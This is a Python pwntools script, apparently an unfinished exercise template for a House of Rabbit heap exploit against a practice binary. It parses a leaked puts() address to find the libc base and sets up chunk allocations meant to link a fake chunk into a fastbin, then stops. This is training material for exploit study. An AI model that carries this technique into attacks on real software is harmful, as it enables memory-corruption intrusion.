#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("house_of_rabbit_nofast")
libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size & data.
# Returns chunk index.
def malloc(size, data):
    global index
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")
    index += 1
    return index - 1

# Select the "free" option; send index.
def free(index):
    io.send(b"2")
    io.sendafter(b"index: ", f"{index}".encode())
    io.recvuntil(b"> ")

# Select the "amend age" option; send new value.
def amend_age(age):
    io.send(b"3")
    io.sendafter(b"age: ", f"{age}".encode())
    io.recvuntil(b"> ")

# Calculate the "wraparound" distance between two addresses.
def delta(x, y):
    return (0xffffffffffffffff - x) + y

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.timeout = 0.1

# =============================================================================

# =-=-=- PREPARE A FAKE CHUNK -=-=-=

age = 1;

io.sendafter(b"age: ", f"{age}".encode())
io.recvuntil(b"> ")


# =-=-=- LINK FAKE CHUNK INTO A FASTBIN -=-=-=

# We can't request fast-sized chunks!

# Request 2 normal chunks.
chunk_A = malloc(0x88, b"A"*8)
chunk_B = malloc(0x88, b"B"*8)

# Free them.
free(chunk_A)
free(chunk_B)

# =============================================================================

io.interactive()
